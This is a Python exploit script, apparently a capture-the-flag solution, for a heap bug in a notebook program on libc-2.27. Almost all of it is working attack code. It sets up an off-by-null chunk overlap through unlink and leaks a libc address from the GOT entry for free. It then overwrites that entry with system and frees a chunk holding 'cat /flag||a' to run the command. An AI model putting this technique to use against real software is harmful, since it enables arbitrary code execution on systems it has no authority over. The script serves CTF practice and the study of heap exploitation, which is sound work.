#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


def add(size, data="default", name="lynne"):
    if len(data) < size:
        data += b"\n" if isinstance(data, bytes) else "\n"
    p.sendlineafter(">", "1")
    p.sendlineafter("please enter the name of the notebook:", name)
    p.sendlineafter("please enter the length of the content:", str(size))
    p.sendafter("please enter the content:", data)


def edit(idx, data):
    p.sendlineafter(">", "2")
    p.sendlineafter("please enter the notebook id to edit:", str(idx))
    p.sendafter("please enter the content of the notebook:", data)


def show(idx):
    p.sendlineafter(">", "3")
    p.sendlineafter("please enter the notebook id to show:", str(idx))
    msg = p.recvlines(2)
    info(f"Get msg: {msg}")
    return msg

def dele(idx):
    p.sendlineafter(">", "4")
    p.sendlineafter("please enter the notebook id to delete:", str(idx))

"""
libc-2.27 off by null -- malloc 
"""
# unlink
add(0x10) # 0
add(0x10) # 1
dele(0) 

add(0x420) # 0
add(0x28) # 2
dele(1) 
add(0x4f0) # 1
add(0x10, "cat /flag||a", "cat /flag||a") # 3

# off by null
dele(0)
edit(2, flat({0x20: 0x4f0}))
dele(1)

add(0x4b0, flat({0x4a0: [6, elf.got['free']]}))

_, m = show(2)
libc_base_addr = u64_ex(m[-6:]) - 0x97950
log_libc_base_addr(libc_base_addr)
libc.address = libc_base_addr

edit(2, p64(libc.sym.system)[:6])

dele(3)

p.interactive()